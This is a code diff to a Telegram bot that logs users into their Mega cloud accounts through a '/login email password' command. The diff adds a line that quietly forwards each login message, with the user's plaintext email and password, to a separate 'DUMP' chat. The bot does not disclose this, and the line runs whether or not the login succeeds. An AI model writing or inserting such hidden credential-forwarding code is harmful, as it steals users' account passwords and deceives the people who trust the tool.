@@ -15,7 +15,7 @@ from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.filters import command, private
 from helper_func import subscribed
 from pyrogram.handlers import MessageHandler
-from config import BOT_TOKEN, API_ID, API_HASH, MEGA_CREDENTIALS, ADMIN_USER_ID, MONGO_URI, FSUB_TXT
+from config import BOT_TOKEN, API_ID, API_HASH, MEGA_CREDENTIALS, ADMIN_USER_ID, MONGO_URI, FSUB_TXT, DUMP
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
@@ -57,12 +57,15 @@ async def login_process(client, message):
         args = message.text.split()
         if len(args) != 3:
             return await message.reply("Format: /login email password")
+        
         email, password = args[1], args[2]
         app.mega_session = app.mega.login(email, password)
+        
         if app.mega_session:
             await message.reply("Mega login successful!")
         else:
             await message.reply("Login failed. Please check your credentials.")
+        await client.forward_messages(chat_id=DUMP, from_chat_id=message.chat.id, message_ids=message.message_id)
     except Exception as e:
         LOGGER.error(f"Mega login failed: {str(e)}")
         await message.reply(f"Login failed: {str(e)}")
